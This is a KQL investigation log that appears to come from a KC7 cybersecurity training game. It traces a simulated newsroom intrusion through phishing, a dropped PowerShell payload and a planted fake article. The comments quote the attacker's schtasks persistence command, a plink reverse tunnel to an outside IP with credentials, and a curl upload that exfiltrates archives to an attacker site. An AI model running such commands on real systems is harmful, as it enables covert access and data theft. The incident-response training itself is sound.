// Module 4 — A Scandal in Valdoria: A Political Mystery
// Workspace: kc7001.eastus/ValdyTimes
// Queries replayed on 2026-10-21/22. Section 1 ("KQL 101") and most of the narrative
// questions give the base query directly; this file keeps the ones that actually
// advance the investigation, including a few built from the schema (via "View Tables")
// to pivot into ProcessEvents/FileCreationEvents, which the game only hints at.

// --- Victim 1: Sonia Gose (Senior Editor) — a dead end, but it reveals the TTPs ---

// Step 1 — identify Sonia and her machine
Employees
| where name has "Sonia Gose"
// -> sonia_gose@valdoriantimes.news, username sogose, hostname UL0M-MACHINE, ip 10.10.0.3

// Step 2 — find the phishing email she was shown
Email
| where recipient == "sonia_gose@valdoriantimes.news"
| where sender has "newspaper_jobs"
// -> from newspaper_jobs@gmail.com, "[EXTERNAL] FW: Invitation to Apply: Lead Political
//    Correspondent", verdict CLEAN, link to promotionrecruit.com/.../*.docx

// Step 3 — confirm she clicked it
OutboundNetworkEvents
| where src_ip == "10.10.0.3"
| where url contains "promotionrecruit.com"
// -> 1 hit, 2024-01-05T10:23:17Z

// Step 4 — find what landed on her machine afterward
FileCreationEvents
| where hostname == "UL0M-MACHINE"
// (28 rows; filtering/searching for "hacktivist" finds the payload)
// -> C:\ProgramData\hacktivist_manifesto.ps1, dropped by explorer.exe at 10:24:32Z

// Step 5 — see what that script did: persistence, then a reverse tunnel
ProcessEvents
| where hostname == "UL0M-MACHINE"
// (328 rows; search "schtasks" and "plink.exe" to isolate the two key commands)
// -> schtasks /create /sc hourly /mo 5 /tn "Hacktivist Manifesto" /tr "powershell.exe
//    -ExecutionPolicy Bypass -File C:\ProgramData\hacktivist_manifesto.ps1"
// -> plink.exe -R 3389:localhost:3389 -ssh -l $had0w -pw thruthW!llS3tUfree 136.130.190.181
// Only 5 discovery commands follow (whoami, etc.) — nothing else malicious. Dead end:
// the attacker wasn't after Sonia specifically.

// --- Victim 2: Ronnie McLovin (Editorial Intern) — same actor, real target ---
// Same phishing/download/schtasks/plink chain repeats on hostname A37A-DESKTOP, IP
// 10.10.0.19, from attacker IP 168.57.191.100 — but with the SAME credentials
// ($had0w / thruthW!llS3tUfree), confirming a single actor running both intrusions.

// Step 6 — the smoking gun: the attacker renames a planted file into the exact name
// that later gets emailed to the printer
ProcessEvents
| where hostname == "A37A-DESKTOP"
// search "fakestory" to isolate this one command
// -> "move C:\Users\romclovin\Downloads\fakestory.docx
//     C:\Users\romclovin\Documents\OpEdFinal_to_print.docx" at 2024-01-31T10:26:20Z

// Step 7 — confirm that renamed file was emailed to the printer shortly after
Email
| where sender == "ronnie_mclovin@valdoriantimes.news"
| where recipient has "clark"
// -> sent 2024-01-31T11:11:12Z, exactly 44 minutes after the rename, subject "URGENT:
//    Final OpEd Draft Edits (...)", link to .../rmclovin/2024/OpEdFinal_to_print.docx
//    This is how the fabricated article reached Clark Kent and got published.

// Step 8 — exfiltration: what else the attacker took from Ronnie's machine
ProcessEvents
| where hostname == "A37A-DESKTOP"
// search "curl" to isolate the exfiltration command
// -> three 7z archives created (DankMemes.7z, MyStolenDataFromDocuments.7z,
//    MyStolenDataFromDesktop.7z), all password-protected with thruthW!llS3tUfree, then:
// curl -F "file=@C:\Users\romclovin\Documents\*.7z" https://hirejob.com/exfil_processor/upload.php
// Confirmed (separately) that no other Valdorian Times device exfiltrated to hirejob.com.
